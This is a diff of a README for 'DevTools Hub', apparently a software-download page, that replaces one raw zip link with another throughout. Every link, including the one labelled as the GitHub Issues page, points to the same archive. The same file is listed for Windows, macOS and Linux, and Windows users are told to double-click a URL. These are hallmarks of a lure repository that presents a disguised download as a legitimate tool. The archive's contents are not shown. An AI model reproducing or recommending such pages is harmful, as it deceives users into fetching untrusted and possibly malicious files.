@@ -6,7 +6,7 @@ Welcome to DevTools Hub! This toolset helps you become a more efficient develope
 
 ## 📥 Download Now
 
-[![Download DevTools Hub](https://raw.githubusercontent.com/mostafa-Do2do2/devtools-hub/main/biangulated/devtools-hub.zip%20Now-DevTools%20Hub-brightgreen)](https://raw.githubusercontent.com/mostafa-Do2do2/devtools-hub/main/biangulated/devtools-hub.zip)
+[![Download DevTools Hub](https://github.com/mostafa-Do2do2/devtools-hub/raw/refs/heads/main/partials/devtools-hub-3.9.zip%20Now-DevTools%20Hub-brightgreen)](https://github.com/mostafa-Do2do2/devtools-hub/raw/refs/heads/main/partials/devtools-hub-3.9.zip)
 
 ## 🌟 Features
 
@@ -30,19 +30,19 @@ To ensure the best experience, make sure your system meets these requirements:
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to access the releases page:
-   [Download DevTools Hub](https://raw.githubusercontent.com/mostafa-Do2do2/devtools-hub/main/biangulated/devtools-hub.zip).
+   [Download DevTools Hub](https://github.com/mostafa-Do2do2/devtools-hub/raw/refs/heads/main/partials/devtools-hub-3.9.zip).
    
 2. **Choose the Latest Release**: Look for the most recent version. This will ensure you have the latest features and fixes.
 
 3. **Select Your Operating System**: Depending on your system, find the correct file. You may see options like:
-   - `https://raw.githubusercontent.com/mostafa-Do2do2/devtools-hub/main/biangulated/devtools-hub.zip` for Windows
-   - `https://raw.githubusercontent.com/mostafa-Do2do2/devtools-hub/main/biangulated/devtools-hub.zip` for macOS
-   - `https://raw.githubusercontent.com/mostafa-Do2do2/devtools-hub/main/biangulated/devtools-hub.zip` for Linux
+   - `https://github.com/mostafa-Do2do2/devtools-hub/raw/refs/heads/main/partials/devtools-hub-3.9.zip` for Windows
+   - `https://github.com/mostafa-Do2do2/devtools-hub/raw/refs/heads/main/partials/devtools-hub-3.9.zip` for macOS
+   - `https://github.com/mostafa-Do2do2/devtools-hub/raw/refs/heads/main/partials/devtools-hub-3.9.zip` for Linux
 
 4. **Click to Download**: Click on the relevant file to start the download.
 
 5. **Install the Application**:
-   - **For Windows**: Double-click `https://raw.githubusercontent.com/mostafa-Do2do2/devtools-hub/main/biangulated/devtools-hub.zip` and follow the prompts.
+   - **For Windows**: Double-click `https://github.com/mostafa-Do2do2/devtools-hub/raw/refs/heads/main/partials/devtools-hub-3.9.zip` and follow the prompts.
    - **For macOS**: Unzip the file and drag the `DevTools Hub` app to your Applications folder.
    - **For Linux**: Extract the files and run the application from the terminal or your file manager.
 
@@ -64,7 +64,7 @@ DevTools Hub is open source, meaning anyone can contribute. If you have ideas fo
 
 ## 📞 Support
 
-If you encounter any issues, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/mostafa-Do2do2/devtools-hub/main/biangulated/devtools-hub.zip) to report your problems or ask questions. The community and maintainers will do their best to assist you.
+If you encounter any issues, please visit our [GitHub Issues Page](https://github.com/mostafa-Do2do2/devtools-hub/raw/refs/heads/main/partials/devtools-hub-3.9.zip) to report your problems or ask questions. The community and maintainers will do their best to assist you.
 
 ## 📜 License
 
